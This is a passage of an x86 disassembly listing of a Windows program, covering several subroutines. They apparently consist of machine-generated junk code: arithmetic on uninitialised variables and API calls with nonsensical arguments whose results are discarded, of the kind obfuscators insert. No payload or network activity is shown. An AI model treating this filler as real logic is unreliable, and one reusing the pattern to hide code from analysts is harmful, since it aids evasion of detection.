		mov	ecx, [ebp+10h]
		sub	ecx, [ebp+8]
		xor	eax, ecx
		mov	[ebp-0FCh], ax
		mov	eax, [ebp-0B4h]
		mov	esp, ebp
		pop	ebp
		retn
; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_408140	proc near		; CODE XREF: WinMain(x,x,x,x)+53D2p

var_24C		= dword	ptr -24Ch
var_248		= dword	ptr -248h
var_241		= byte ptr -241h
var_240		= dword	ptr -240h
var_234		= dword	ptr -234h
var_230		= dword	ptr -230h
var_210		= dword	ptr -210h
var_1D8		= dword	ptr -1D8h
hMem		= dword	ptr -1B8h
var_1B4		= word ptr -1B4h
var_1AD		= byte ptr -1ADh
var_1AC		= dword	ptr -1ACh
var_1A1		= byte ptr -1A1h
var_194		= dword	ptr -194h
Node		= byte ptr -190h
var_18C		= dword	ptr -18Ch
var_188		= word ptr -188h
var_184		= word ptr -184h
var_10A		= byte ptr -10Ah
var_108		= word ptr -108h
var_104		= dword	ptr -104h
var_F9		= byte ptr -0F9h
var_F4		= word ptr -0F4h
var_F0		= dword	ptr -0F0h
var_E0		= dword	ptr -0E0h
var_D9		= byte ptr -0D9h
var_D8		= word ptr -0D8h
var_D0		= word ptr -0D0h
var_CC		= dword	ptr -0CCh
var_BD		= byte ptr -0BDh
var_BC		= word ptr -0BCh
var_B8		= dword	ptr -0B8h
var_B4		= word ptr -0B4h
var_B0		= word ptr -0B0h
var_A0		= dword	ptr -0A0h
var_9C		= dword	ptr -9Ch
var_1E		= byte ptr -1Eh
var_1D		= byte ptr -1Dh
var_7		= byte ptr -7
var_5		= byte ptr -5
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h
arg_10		= dword	ptr  18h

		push	ebp
		mov	ebp, esp
		sub	esp, 24Ch
		push	ebx
		mov	eax, [ebp+arg_10]
		mov	ecx, dword ptr [ebp+Node]
		lea	edx, [ecx+eax+58h]
		mov	[ebp+var_CC], edx
		mov	eax, [ebp+arg_C]
		add	eax, 3
		mov	[ebp+arg_10], eax
		mov	ecx, [ebp+arg_C]
		mov	[ebp+var_24C], ecx
		cmp	[ebp+var_24C], 0
		jz	short loc_408193
		cmp	[ebp+var_24C], 1
		jz	short loc_4081C3
		cmp	[ebp+var_24C], 2
		jz	loc_40820E
		jmp	loc_4082C2
; ---------------------------------------------------------------------------

loc_408193:				; CODE XREF: sub_408140+36j
		mov	[ebp+arg_0], 2Ch
		cmp	dword_42C010, 33h
		jg	short loc_4081BE
		movzx	edx, [ebp+var_5]
		mov	eax, [ebp+var_234]
		lea	ecx, [edx+eax-0Bh]
		and	ecx, [ebp+var_B8]
		mov	[ebp+var_D8], cx

loc_4081BE:				; CODE XREF: sub_408140+61j
		jmp	loc_4082D1
; ---------------------------------------------------------------------------

loc_4081C3:				; CODE XREF: sub_408140+3Fj
		mov	edx, [ebp+var_194]
		cmp	edx, dword_42C004
		jle	short loc_408209
		movzx	eax, [ebp+var_241]
		mov	[ebp+arg_0], eax
		movzx	ecx, [ebp+var_1AD]
		mov	edx, [ebp+var_18C]
		lea	ebx, [edx+ecx-4Dh]
		movzx	eax, [ebp+var_B0]
		sub	ebx, eax
		push	0Eh		; AvailableBytes
		mov	ecx, dword ptr [ebp+Node]
		push	ecx		; Node
		call	ds:GetNumaAvailableMemoryNode
		xor	ebx, eax
		mov	[ebp+var_7], bl

loc_408209:				; CODE XREF: sub_408140+8Fj
		jmp	loc_4082D1
; ---------------------------------------------------------------------------

loc_40820E:				; CODE XREF: sub_408140+48j
		movzx	edx, [ebp+var_BD]
		cmp	edx, [ebp+var_A0]
		jle	short loc_408266
		mov	eax, [ebp+arg_4]
		push	eax
		mov	ecx, [ebp+var_A0]
		push	ecx
		mov	edx, [ebp+var_18C]
		push	edx
		mov	eax, [ebp+arg_10]
		push	eax
		mov	ecx, [ebp+arg_10]
		push	ecx
		call	sub_4092F0
		add	esp, 14h
		mov	[ebp+var_A0], eax
		mov	edx, [ebp+hMem]
		push	edx		; hMem
		call	ds:GlobalUnfix
		sub	eax, [ebp+arg_C]
		movzx	ecx, [ebp+var_188]
		sub	eax, ecx
		mov	[ebp+var_1AC], eax
		jmp	short loc_408299
; ---------------------------------------------------------------------------

loc_408266:				; CODE XREF: sub_408140+DBj
		mov	edx, [ebp+var_4]
		add	edx, 10h
		mov	eax, dword ptr [ebp+Node]
		add	eax, 56h
		sub	eax, [ebp+arg_0]
		xor	edx, eax
		mov	[ebp+var_1D], dl
		movzx	ecx, [ebp+var_BD]
		sub	ecx, [ebp+var_230]
		and	ecx, dword ptr [ebp+Node]
		and	ecx, 7Ah
		mov	[ebp+var_F9], cl

loc_408299:				; CODE XREF: sub_408140+124j
		cmp	[ebp+arg_C], 5Bh
		jge	short loc_4082C0
		mov	edx, [ebp+arg_0]
		mov	eax, [ebp+arg_10]
		lea	ecx, [eax+edx+2Bh]
		mov	[ebp+var_F4], cx
		mov	edx, [ebp+arg_10]
		mov	eax, [ebp+arg_8]
		lea	ecx, [eax+edx+56h]
		mov	[ebp+var_240], ecx

loc_4082C0:				; CODE XREF: sub_408140+15Dj
		jmp	short loc_4082D1
; ---------------------------------------------------------------------------

loc_4082C2:				; CODE XREF: sub_408140+4Ej
		mov	edx, [ebp+var_F0]
		sub	edx, 0Eh
		mov	dword ptr [ebp+Node], edx

loc_4082D1:				; CODE XREF: sub_408140:loc_4081BEj
					; sub_408140:loc_408209j ...
		movzx	eax, [ebp+var_1E]
		sub	eax, 3Fh
		xor	eax, [ebp+var_9C]
		mov	[ebp+var_B0], ax
		mov	[ebp+var_248], 0
		jmp	short loc_408300
; ---------------------------------------------------------------------------

loc_4082F1:				; CODE XREF: sub_408140+22Cj
		mov	ecx, [ebp+var_248]
		add	ecx, 1
		mov	[ebp+var_248], ecx

loc_408300:				; CODE XREF: sub_408140+1AFj
		cmp	[ebp+var_248], 0Fh
		jge	short loc_40836E
		mov	edx, [ebp+var_18C]
		sub	edx, 20h
		mov	[ebp+arg_8], edx
		movzx	eax, [ebp+var_108]
		mov	ecx, [ebp+var_104]
		sub	ecx, eax
		mov	[ebp+arg_0], ecx
		mov	[ebp+var_210], 62h
		movzx	edx, [ebp+var_184]
		add	edx, 20h
		movzx	eax, [ebp+var_BC]
		sub	eax, edx
		mov	[ebp+var_BC], ax
		mov	cl, byte ptr [ebp+var_BC]
		mov	[ebp+var_F9], cl
		mov	edx, [ebp+arg_10]
		sub	edx, 0Eh
		sub	edx, [ebp+var_9C]
		sub	edx, 90h
		mov	[ebp+var_1D], dl
		jmp	short loc_4082F1
; ---------------------------------------------------------------------------

loc_40836E:				; CODE XREF: sub_408140+1C7j
		movzx	eax, [ebp+var_F9]
		mov	dword_42C03C, eax
		mov	ecx, 11h
		mov	word ptr [ebp+var_A0], cx
		mov	edx, [ebp+arg_10]
		mov	[ebp+var_1D8], edx
		mov	[ebp+arg_0], 22h
		movzx	eax, [ebp+var_184]
		mov	ecx, 2Eh
		sub	ecx, eax
		and	ecx, 62h
		movzx	edx, [ebp+var_D9]
		sub	edx, ecx
		mov	[ebp+var_D9], dl
		movzx	eax, [ebp+var_10A]
		mov	ecx, [ebp+var_18C]
		lea	edx, [eax+ecx+14h]
		mov	[ebp+var_E0], edx
		cmp	dword_42C010, 2Ch
		jge	short loc_4083F8
		movzx	eax, [ebp+var_10A]
		mov	ecx, dword ptr [ebp+Node]
		add	ecx, 30h
		movzx	edx, [ebp+var_D0]
		sub	ecx, edx
		or	eax, ecx
		mov	[ebp+var_1B4], ax

loc_4083F8:				; CODE XREF: sub_408140+294j
		movzx	eax, [ebp+var_1A1]
		sub	eax, [ebp+var_A0]
		mov	[ebp+var_A0], eax
		mov	[ebp+hMem], 16h
		mov	dword ptr [ebp+Node], 21h
		mov	ecx, 47h
		mov	[ebp+var_B4], cx
		mov	edx, [ebp+arg_4]
		mov	eax, [ebp+var_18C]
		lea	ecx, [eax+edx-52h]
		mov	[ebp+var_7], cl
		mov	edx, [ebp+var_234]
		xor	edx, 68h
		mov	[ebp+var_CC], edx
		mov	eax, dword ptr [ebp+Node]
		pop	ebx
		mov	esp, ebp
		pop	ebp
		retn
sub_408140	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_408460	proc near		; CODE XREF: sub_407A90+29Cp

var_240		= word ptr -240h
var_1B8		= dword	ptr -1B8h
var_1A4		= word ptr -1A4h
var_1A0		= dword	ptr -1A0h
var_198		= word ptr -198h
var_12C		= dword	ptr -12Ch
var_119		= byte ptr -119h
var_118		= word ptr -118h
var_105		= byte ptr -105h
var_104		= word ptr -104h
var_100		= word ptr -100h
var_FC		= dword	ptr -0FCh
var_F0		= dword	ptr -0F0h
var_EC		= dword	ptr -0ECh
var_E4		= dword	ptr -0E4h
var_D8		= word ptr -0D8h
var_C4		= dword	ptr -0C4h
var_BC		= word ptr -0BCh
var_B0		= dword	ptr -0B0h
var_A4		= dword	ptr -0A4h
var_9C		= dword	ptr -9Ch
var_1A		= byte ptr -1Ah

		push	ebp
		mov	ebp, esp
		sub	esp, 250h
		mov	eax, [ebp+var_C4]
		add	eax, 35h
		sub	eax, [ebp+var_1B8]
		mov	[ebp+var_A4], eax
		mov	ecx, [ebp+var_C4]
		mov	[ebp+var_EC], ecx
		mov	[ebp+var_12C], 4Ah
		mov	edx, [ebp+var_C4]
		add	edx, 55h
		xor	edx, [ebp+var_EC]
		mov	[ebp+var_9C], edx
		mov	eax, [ebp+var_1B8]
		add	eax, 53h
		xor	eax, [ebp+var_1A0]
		mov	[ebp+var_240], ax
		mov	ecx, [ebp+var_A4]
		mov	[ebp+var_C4], ecx
		mov	edx, [ebp+var_B0]
		add	edx, 16h
		sub	edx, [ebp+var_F0]
		add	edx, 3Bh
		mov	[ebp+var_118], dx
		movzx	eax, [ebp+var_BC]
		mov	ecx, [ebp+var_E4]
		sub	ecx, eax
		and	ecx, 53h
		mov	[ebp+var_1A], cl
		movzx	edx, [ebp+var_104]
		mov	[ebp+var_F0], edx
		movzx	eax, [ebp+var_100]
		sub	eax, 0Ah
		movzx	ecx, [ebp+var_198]
		or	eax, ecx
		mov	[ebp+var_240], ax
		movzx	edx, [ebp+var_D8]
		mov	eax, [ebp+var_B0]
		lea	ecx, [edx+eax-0Bh]
		mov	[ebp+var_FC], ecx
		movzx	edx, [ebp+var_1A4]
		movzx	eax, [ebp+var_1A4]
		lea	ecx, [eax+edx+1Dh]
		mov	[ebp+var_1A4], cx
		mov	edx, 1Bh
		sub	edx, [ebp+var_1B8]
		mov	[ebp+var_1B8], edx
		mov	eax, dword_42C038
		sub	eax, 19h
		mov	dword_42C038, eax
		mov	ecx, 1Fh
		sub	ecx, [ebp+var_EC]
		and	ecx, 62h
		mov	[ebp+var_1A0], ecx
		movzx	edx, [ebp+var_119]
		and	edx, [ebp+var_C4]
		movzx	eax, [ebp+var_105]
		sub	eax, edx
		mov	[ebp+var_105], al
		mov	eax, [ebp+var_1B8]
		mov	esp, ebp
		pop	ebp
		retn
sub_408460	endp

; ---------------------------------------------------------------------------
		align 10h
		push	ebp
		mov	ebp, esp
		sub	esp, 26Ch
		movzx	eax, word ptr [ebp-0E8h]
		sub	eax, 3Eh
		sub	eax, [ebp+14h]
		mov	[ebp-264h], eax
		mov	ecx, [ebp-104h]
		add	ecx, [ebp-0A0h]
		sub	ecx, [ebp-0A4h]
		sub	ecx, 39h
		mov	[ebp-0E4h], cx
		mov	edx, dword_42C034
		xor	edx, 44h
		mov	dword_42C034, edx
		mov	dword ptr [ebp-20h], 5Dh
		movzx	eax, byte ptr [ebp-0E9h]
		mov	ecx, [ebp-0ACh]
		lea	edx, [ecx+eax+35h]
		xor	edx, 18h
		mov	[ebp-10Eh], dl
		movzx	eax, word ptr [ebp-0E4h]
		add	eax, 49h
		mov	[ebp-0A0h], eax
		mov	ecx, [ebp-20h]
		mov	[ebp-160h], ecx
		mov	edx, [ebp-1CCh]
		and	edx, 2Dh
		mov	eax, dword_42C038
		sub	eax, edx
		mov	dword_42C038, eax
		mov	eax, [ebp-20h]
		mov	esp, ebp
		pop	ebp
		retn
; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl sub_408650(HWND hWnd, int)
sub_408650	proc near		; CODE XREF: .text:00402419p
					; .text:004090C8p ...

var_260		= dword	ptr -260h
var_250		= word ptr -250h
var_248		= dword	ptr -248h
var_220		= dword	ptr -220h
var_1CC		= word ptr -1CCh
var_1C0		= dword	ptr -1C0h
var_1B4		= dword	ptr -1B4h
var_1AD		= byte ptr -1ADh
cbNewSize	= dword	ptr -19Ch
var_198		= word ptr -198h
var_115		= byte ptr -115h
var_102		= byte ptr -102h
var_100		= word ptr -100h
var_FC		= word ptr -0FCh
var_F8		= dword	ptr -0F8h
var_E0		= word ptr -0E0h
var_D8		= word ptr -0D8h
var_C8		= dword	ptr -0C8h
var_C1		= byte ptr -0C1h
var_BC		= dword	ptr -0BCh
var_B4		= dword	ptr -0B4h
var_B0		= dword	ptr -0B0h
var_AC		= dword	ptr -0ACh
var_A0		= dword	ptr -0A0h
var_91		= byte ptr -91h
var_90		= word ptr -90h
var_7C		= dword	ptr -7Ch
var_6A		= word ptr -6Ah
var_1E		= byte ptr -1Eh
var_1D		= byte ptr -1Dh
var_18		= word ptr -18h
var_C		= dword	ptr -0Ch
var_6		= byte ptr -6
var_4		= dword	ptr -4
hWnd		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 260h
		push	esi
		mov	eax, [ebp+var_B0]
		sub	eax, 12Ch
		mov	[ebp+var_6], al
		movzx	ecx, [ebp+var_E0]
		add	ecx, 49h
		mov	[ebp+var_FC], cx
		mov	edx, 0FFACh
		mov	[ebp+var_18], dx
		mov	eax, [ebp+arg_4]
		mov	[ebp+arg_4], eax
		movzx	ecx, [ebp+var_1E]
		add	ecx, 75h
		movzx	edx, [ebp+var_100]
		or	ecx, edx
		mov	[ebp+var_100], cx
		mov	eax, [ebp+var_AC]
		sub	eax, 55h
		xor	eax, 1Eh
		mov	[ebp+var_A0], eax
		mov	[ebp+var_260], 40h
		movzx	ecx, [ebp+var_102]
		mov	edx, 2
		sub	edx, ecx
		xor	edx, 4Ah
		mov	[ebp+var_250], dx
		mov	eax, [ebp+var_F8]
		sub	eax, [ebp+var_248]
		mov	ecx, [ebp+var_260]
		lea	edx, [eax+ecx-59h]
		mov	[ebp+var_90], dx
		call	ds:GetProcessWindowStation
		mov	esi, eax
		mov	eax, [ebp+cbNewSize]
		push	eax		; cbNewSize
		push	59h		; hMem
		call	ds:LocalShrink
		lea	ecx, [esi+eax+52h]
		sub	ecx, [ebp+var_AC]
		and	ecx, [ebp+cbNewSize]
		mov	[ebp+var_1D], cl
		mov	edx, 36h
		movzx	eax, [ebp+var_100]
		lea	ecx, [edx+eax-3Ah]
		mov	[ebp+var_6], cl
		mov	edx, [ebp+var_BC]
		sub	edx, [ebp+var_BC]
		xor	edx, 37h
		mov	[ebp+var_4], edx
		movzx	eax, [ebp+var_102]
		movzx	ecx, [ebp+var_1AD]
		lea	edx, [eax+ecx+32h]
		sub	edx, [ebp+var_B4]
		mov	[ebp+var_115], dl
		movzx	eax, [ebp+var_6]
		mov	ecx, [ebp+var_1B4]
		lea	edx, [eax+ecx+28h]
		mov	[ebp+var_6], dl
		mov	eax, [ebp+var_260]
		add	eax, [ebp+arg_4]
		mov	[ebp+var_C], eax
		movzx	ecx, [ebp+var_1D]
		mov	dword_42C038, ecx
		mov	[ebp+var_220], 19h
		movzx	edx, [ebp+var_91]
		movzx	eax, [ebp+var_1CC]
		sub	edx, eax
		or	edx, 1Eh
		mov	[ebp+var_198], dx
		mov	ecx, [ebp+var_1B4]
		push	ecx		; int
		mov	edx, [ebp+var_B0]
		push	edx		; int
		mov	eax, [ebp+hWnd]
		push	eax		; hWnd
		mov	ecx, [ebp+arg_4]
		push	ecx		; int
		mov	edx, [ebp+var_260]
		push	edx		; int
		call	sub_40F1F0
		add	esp, 14h
		or	eax, [ebp+var_AC]
		mov	[ebp+var_C], eax
		mov	[ebp+var_AC], 1Dh
		movzx	eax, [ebp+var_6A]
		mov	[ebp+var_B4], eax
		mov	ecx, [ebp+var_AC]
		mov	[ebp+var_7C], ecx
		mov	edx, [ebp+var_1C0]
		add	edx, 28h
		sub	edx, [ebp+var_C8]
		add	edx, 13h
		mov	[ebp+var_D8], dx
		mov	eax, dword_42C044
		sub	eax, 1Eh
		mov	dword_42C044, eax
		mov	[ebp+var_B4], 0Bh
		movzx	ecx, [ebp+var_C1]
		movzx	edx, [ebp+var_91]
		sub	edx, ecx
		mov	[ebp+var_91], dl
		mov	eax, dword_42C058
		sub	eax, 2Dh
		mov	dword_42C058, eax
		mov	eax, [ebp+var_AC]
		pop	esi
		mov	esp, ebp
		pop	ebp
		retn
sub_408650	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_408860	proc near		; CODE XREF: sub_407820+D7p

var_249		= byte ptr -249h
var_240		= dword	ptr -240h
var_234		= dword	ptr -234h
var_20C		= dword	ptr -20Ch
var_1B4		= dword	ptr -1B4h
var_194		= dword	ptr -194h
var_190		= word ptr -190h
var_114		= dword	ptr -114h
var_108		= dword	ptr -108h
var_FE		= byte ptr -0FEh
var_FC		= word ptr -0FCh
hWnd		= dword	ptr -0E0h
var_D0		= word ptr -0D0h
var_BD		= byte ptr -0BDh
var_B0		= word ptr -0B0h
var_AC		= dword	ptr -0ACh
var_94		= dword	ptr -94h
var_24		= dword	ptr -24h
var_10		= dword	ptr -10h
var_5		= byte ptr -5
arg_0		= dword	ptr  8
arg_C		= dword	ptr  14h

		push	ebp
		mov	ebp, esp
		sub	esp, 24Ch
		cmp	[ebp+var_24], 3Dh
		jl	short loc_408890
		mov	eax, [ebp+var_AC]
		xor	eax, 26h
		mov	[ebp+arg_0], eax
		mov	ecx, [ebp+arg_C]
		sub	ecx, 0Eh
		movzx	edx, [ebp+var_FC]
		and	ecx, edx
		mov	[ebp+var_94], ecx

loc_408890:				; CODE XREF: sub_408860+Dj
		mov	eax, [ebp+var_108]
		add	eax, 48h
		mov	[ebp+var_1B4], eax
		mov	[ebp+var_114], 0Bh
		mov	ecx, [ebp+var_1B4]
		add	ecx, 7Bh
		sub	ecx, [ebp+var_114]
		mov	[ebp+var_190], cx
		mov	edx, [ebp+var_194]
		sub	edx, [ebp+hWnd]
		or	edx, [ebp+hWnd]
		mov	[ebp+var_234], edx
		mov	eax, [ebp+var_194]
		sub	eax, [ebp+arg_C]
		xor	eax, 0Bh
		mov	[ebp+var_AC], eax
		movzx	ecx, [ebp+var_FE]
		add	ecx, 20h
		movzx	edx, [ebp+var_D0]
		sub	ecx, edx
		movzx	eax, [ebp+var_BD]
		add	eax, ecx
		mov	[ebp+var_BD], al
		movzx	ecx, [ebp+var_D0]
		add	ecx, 74h
		mov	[ebp+var_94], ecx
		mov	edx, [ebp+hWnd]
		push	edx		; hWnd
		call	ds:GetDC
		movzx	ecx, [ebp+var_5]
		sub	eax, ecx
		mov	[ebp+arg_C], eax
		mov	[ebp+hWnd], 61h
		mov	edx, [ebp+var_194]
		mov	[ebp+var_20C], edx
		mov	eax, 26h
		sub	eax, [ebp+var_1B4]
		sub	eax, [ebp+var_AC]
		add	eax, 38h
		mov	[ebp+var_B0], ax
		mov	ecx, [ebp+var_108]
		sub	ecx, 84h
		mov	[ebp+var_10], ecx
		movzx	edx, [ebp+var_B0]
		add	edx, 9
		movzx	eax, [ebp+var_249]
		sub	eax, edx
		mov	[ebp+var_249], al
		mov	eax, [ebp+var_240]
		mov	esp, ebp
		pop	ebp
		retn
sub_408860	endp

; ---------------------------------------------------------------------------
		align 10h
		push	ebp
		mov	ebp, esp
		sub	esp, 258h
		push	ebx
		push	esi
		mov	eax, [ebp-110h]
		mov	y, eax
		mov	ecx, hdc
		add	ecx, 6Dh
		mov	[ebp-0DCh], ecx
		movzx	edx, byte ptr [ebp-1B1h]
		mov	eax, 55h
		sub	eax, edx
		movzx	ecx, byte ptr [ebp-0D5h]
		lea	edx, [eax+ecx-17h]
		mov	[ebp-0F8h], dx
		movzx	eax, word ptr [ebp-18Ch]
		and	eax, 33h
		movzx	ecx, word ptr [ebp-0C4h]
		sub	ecx, eax
		mov	[ebp-0C4h], cx
		mov	edx, 4Fh
		mov	word ptr hProcess, dx
		mov	eax, dword_42C024
		mov	[ebp-84h], eax
		mov	ecx, lpExitCode
		push	ecx
		mov	edx, lpExitCode
		push	edx
		call	ds:GetWindowPlacement
		sub	eax, [ebp-0C8h]
		movzx	ecx, word ptr [ebp-240h]
		add	eax, [ebp-110h]
		add	ecx, eax
		mov	[ebp-0ACh], cx
		mov	hProcess, 3Ah
		movzx	edx, word ptr [ebp-18h]
		mov	eax, [ebp-0A8h]
		lea	ecx, [edx+eax-0A6h]
		mov	[ebp-116h], cl
		movzx	edx, byte ptr [ebp-1B1h]
		or	edx, 33h
		mov	y, edx
		movzx	eax, word ptr [ebp-244h]
		sub	eax, lpExitCode
		movzx	ecx, word ptr [ebp-0D4h]
		add	eax, ecx
		xor	eax, 30h
		mov	[ebp-90h], ax
		mov	edx, dword_42C024
		add	edx, 52h
		mov	hdc, edx
		movzx	eax, byte ptr y
		mov	y, eax
		mov	ecx, hdc
		mov	[ebp-134h], ecx
		mov	edx, dword_42C024
		add	edx, 49h
		or	edx, 0FFFFFFFEh
		mov	[ebp-91h], dl
		mov	eax, [ebp-0B4h]
		sub	eax, 1Dh
		mov	hdc, eax
		movzx	ecx, word ptr [ebp-0F8h]
		movzx	edx, word ptr [ebp-14h]
		movzx	eax, word ptr [ebp-18h]
		add	edx, eax
		or	ecx, edx
		mov	[ebp-0F4h], ecx
		mov	ecx, hProcess
		mov	hProcess, ecx
		mov	y, 14h
		mov	dword ptr [ebp-250h], 0
		jmp	short loc_408B28
; ---------------------------------------------------------------------------

loc_408B19:				; CODE XREF: .text:00408C2Fj
		mov	edx, [ebp-250h]
		add	edx, 1
		mov	[ebp-250h], edx

loc_408B28:				; CODE XREF: .text:00408B17j
		cmp	dword ptr [ebp-250h], 0Ch
		jge	loc_408C34
		cmp	dword ptr [ebp-11Ch], 0Dh
		jg	short loc_408B5A
		movzx	eax, byte ptr [ebp-249h]
		movzx	ecx, word ptr [ebp-0D4h]
		sub	eax, ecx
		sub	eax, 0A2h
		mov	[ebp-244h], ax

loc_408B5A:				; CODE XREF: .text:00408B3Cj
		mov	dx, [ebp-1B8h]
		mov	[ebp-1B8h], dx
		mov	eax, [ebp-0E4h]
		mov	[ebp-1ECh], eax
		movzx	ecx, byte ptr [ebp-1A5h]
		add	ecx, 21h
		mov	edx, [ebp-1BCh]
		add	edx, 39h
		xor	ecx, edx
		mov	[ebp-0D0h], cx
		movzx	eax, byte ptr [ebp-1A5h]
		mov	ecx, [ebp-1B8h]
		sub	ecx, eax
		sub	ecx, [ebp-110h]
		mov	[ebp-98h], ecx
		movzx	edx, word ptr [ebp-14h]
		mov	eax, [ebp-11Ch]
		lea	ecx, [eax+edx+30h]
		mov	[ebp-1C0h], cx
		movzx	edx, byte ptr [ebp-6]
		sub	edx, [ebp-104h]
		sub	edx, 21h
		movzx	eax, byte ptr [ebp-1Ah]
		xor	eax, edx
		mov	[ebp-1Ah], al
		mov	ecx, 61h
		sub	ecx, [ebp-23Ch]
		sub	ecx, 31h
		sub	ecx, [ebp-120h]
		sub	ecx, 3Fh
		mov	[ebp-0B9h], cl
		mov	edx, [ebp-1B8h]
		add	edx, [ebp-1BCh]
		mov	[ebp-11Ch], edx
		mov	eax, dword_42C040
		add	eax, 52h
		mov	dword_42C040, eax
		mov	ecx, 2Bh
		sub	ecx, [ebp-0F4h]
		sub	ecx, 3Ch
		sub	ecx, [ebp-1B8h]
		sub	ecx, [ebp-1BCh]
		mov	[ebp-19h], cl
		jmp	loc_408B19
; ---------------------------------------------------------------------------

loc_408C34:				; CODE XREF: .text:00408B2Fj
		movzx	edx, word ptr [ebp-1ACh]
		xor	edx, 8Ah
		mov	[ebp-0F8h], dx
		movzx	eax, word ptr [ebp-0CAh]
		mov	[ebp-0E4h], eax
		mov	ecx, [ebp-0E4h]
		mov	[ebp-104h], ecx
		movzx	edx, word ptr [ebp-0D4h]
		mov	eax, 0FFFFFFE3h
		sub	eax, edx
		movzx	ecx, word ptr [ebp-0FCh]
		or	eax, ecx
		or	eax, 49h
		mov	[ebp-6], al
		mov	dword ptr [ebp-1E8h], 4Ch
		mov	edx, hdc
		xor	edx, [ebp-98h]
		or	edx, 2Dh
		mov	[ebp-1A0h], edx
		movzx	eax, word ptr [ebp-14h]
		movzx	ecx, word ptr [ebp-0CCh]
		and	eax, ecx
		or	eax, 3Ch
		mov	[ebp-0B4h], eax
		mov	dword ptr [ebp-200h], 3Eh
		movzx	edx, word ptr [ebp-1A4h]
		mov	eax, 43h
		sub	eax, edx
		xor	eax, y
		mov	[ebp-110h], eax
		mov	ecx, [ebp-0E4h]
		mov	edx, [ebp-1B0h]
		lea	eax, [edx+ecx+0Dh]
		mov	[ebp-8Ch], eax
		mov	dword ptr [ebp-170h], 29h
		movzx	ecx, word ptr [ebp-0F8h]
		mov	edx, 30h
		sub	edx, ecx
		mov	[ebp-198h], dx
		movzx	eax, byte ptr [ebp-0DDh]
		mov	ecx, 25h
		sub	ecx, eax
		add	ecx, [ebp-1A0h]
		or	ecx, 45h
		mov	[ebp-0D0h], cx
		mov	dword ptr [ebp-254h], 0
		jmp	short loc_408D45
; ---------------------------------------------------------------------------

loc_408D36:				; CODE XREF: .text:00408DF9j
		mov	edx, [ebp-254h]
		add	edx, 1
		mov	[ebp-254h], edx

loc_408D45:				; CODE XREF: .text:00408D34j
		cmp	dword ptr [ebp-254h], 8
		jge	loc_408DFE
		mov	dword ptr [ebp-1BCh], 2Fh
		movzx	eax, byte ptr [ebp-0DDh]
		sub	eax, [ebp-1BCh]
		sub	eax, [ebp-1BCh]
		sub	eax, 4Ah
		mov	[ebp-18h], ax
		movzx	ecx, byte ptr [ebp-1Ah]
		mov	edx, 3Ch
		sub	edx, ecx
		add	edx, 58h
		movzx	eax, word ptr [ebp-198h]
		sub	eax, edx
		mov	[ebp-198h], ax
		mov	ecx, [ebp-11Ch]
		push	ecx
		mov	edx, [ebp-0E4h]
		push	edx
		mov	eax, [ebp-1B8h]
		push	eax
		mov	ecx, [ebp-0E4h]
		push	ecx
		mov	edx, [ebp-11Ch]
		push	edx
		mov	eax, [ebp-104h]
		push	eax
		call	sub_40EDD0
		add	esp, 18h
		sub	eax, 50h
		sub	eax, [ebp-120h]
		mov	[ebp-0C8h], eax
		mov	ecx, dword_42C038
		sub	ecx, 46h
		mov	dword_42C038, ecx
		mov	edx, [ebp-0E4h]
		mov	[ebp-0E4h], edx
		mov	eax, [ebp-11Ch]
		mov	[ebp-6Ch], eax
		jmp	loc_408D36
; ---------------------------------------------------------------------------

loc_408DFE:				; CODE XREF: .text:00408D4Cj
		mov	ecx, 9
		sub	ecx, [ebp-1BCh]
		add	ecx, 59h
		movzx	edx, word ptr [ebp-0B0h]
		sub	edx, ecx
		mov	[ebp-0B0h], dx
		mov	dword ptr [ebp-16Ch], 3Bh
		movzx	eax, word ptr [ebp-0B8h]
		mov	ecx, 4Ch
		sub	ecx, eax
		movzx	edx, word ptr [ebp-90h]
		sub	ecx, edx
		mov	[ebp-1C0h], cx
		cmp	dword_42C024, 42h
		jle	short loc_408E88
		movzx	eax, word ptr [ebp-0B8h]
		sub	eax, 14h
		movzx	ecx, word ptr [ebp-0F8h]
		xor	eax, ecx
		xor	eax, [ebp-1B0h]
		mov	[ebp-115h], al
		movzx	edx, word ptr [ebp-0CCh]
		add	edx, 31h
		or	edx, lpExitCode
		or	edx, 3Eh
		mov	[ebp-0D0h], dx
		jmp	short loc_408EA6
; ---------------------------------------------------------------------------

loc_408E88:				; CODE XREF: .text:00408E4Bj
		movzx	eax, byte ptr [ebp-116h]
		add	eax, [ebp-4]
		mov	Wow64Process, eax
		mov	ecx, y
		add	ecx, 17h
		mov	lpExitCode, ecx

loc_408EA6:				; CODE XREF: .text:00408E86j
		mov	edx, offset y
		sub	edx, 37h
		movzx	eax, word ptr [edx]
		mov	Wow64Process, eax
		mov	ecx, hdc
		mov	[ebp-220h], ecx
		mov	edx, hProcess
		add	edx, 3Ah
		or	edx, lpExitCode
		mov	[ebp-198h], dx
		movzx	eax, word ptr [ebp-240h]
		xor	eax, [ebp-104h]
		mov	[ebp-1BCh], eax
		movzx	ecx, word ptr [ebp-22Ch]
		mov	dword_42C044, ecx
		movzx	ebx, word ptr [ebp-0D0h]
		add	ebx, 10h
		movzx	edx, word ptr [ebp-90h]
		sub	ebx, edx
		mov	eax, [ebp-1B8h]
		push	eax
		mov	ecx, [ebp-0E4h]
		push	ecx
		mov	edx, [ebp-11Ch]
		push	edx
		mov	eax, [ebp-11Ch]
		push	eax
		mov	ecx, [ebp-1BCh]
		push	ecx
		call	sub_4071A0
		add	esp, 14h
		add	ebx, eax
		xor	ebx, [ebp-120h]
		mov	[ebp-0B9h], bl
		push	48h
		mov	edx, [ebp-11Ch]
		push	edx
		call	ds:GetTextMetricsW
		mov	ecx, 12h
		sub	ecx, eax
		mov	[ebp-1BCh], ecx
		movzx	edx, word ptr [ebp-0ACh]
		movzx	eax, word ptr [ebp-1A4h]
		sub	edx, eax
		mov	ecx, dword_42C034
		sub	ecx, edx
		mov	dword_42C034, ecx
		mov	edx, 20h
